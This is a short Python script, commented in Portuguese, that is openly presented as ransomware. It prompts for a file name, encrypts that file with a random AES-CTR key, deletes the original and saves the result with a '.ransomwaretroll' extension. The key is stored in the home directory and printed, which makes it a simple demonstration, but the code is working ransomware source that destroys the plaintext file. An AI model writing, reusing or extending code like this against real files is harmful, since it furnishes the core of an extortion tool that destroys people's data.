import os
import pyaes
import secrets

def generate_random_key():
    return secrets.token_bytes(16)

def save_key_to_file(key, file_name):
    with open(file_name, 'wb') as key_file:
        key_file.write(key)

def read_file(file_name):
    with open(file_name, "rb") as file:
        file_data = file.read()
    return file_data

def remove_file(file_name):
    os.remove(file_name)

def encrypt_file(file_data, key):
    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)
    return crypto_data

def save_encrypted_file(file_name, crypto_data):
    new_file_name = file_name + ".ransomwaretroll"
    with open(new_file_name, 'wb') as new_file:
        new_file.write(crypto_data)

if __name__ == "__main__":
    # Solicitar ao usuário o nome do arquivo a ser criptografado
    file_name = input("Digite o nome do arquivo a ser criptografado: ")

    # Gerar chave aleatória de 16 bytes
    key = generate_random_key()

    # Salvar a chave em um arquivo na pasta raiz do usuário
    key_file_name = os.path.expanduser("~/chave_aleatoria.key")
    save_key_to_file(key, key_file_name)

    # Exemplo de como imprimir a chave gerada
    print("Chave gerada:", key)

    try:
        # Ler o arquivo
        file_data = read_file(file_name)

        # Remover o arquivo original
        remove_file(file_name)

        # Criptografar o arquivo
        crypto_data = encrypt_file(file_data, key)

        # Salvar o arquivo criptografado
        save_encrypted_file(file_name, crypto_data)
        print(f"Arquivo {file_name} criptografado com sucesso!")

    except FileNotFoundError:
        print(f"Arquivo {file_name} não encontrado. Certifique-se de que o arquivo existe.")
    except Exception as e:
        print(f"Ocorreu um erro durante a criptografia: {e}")
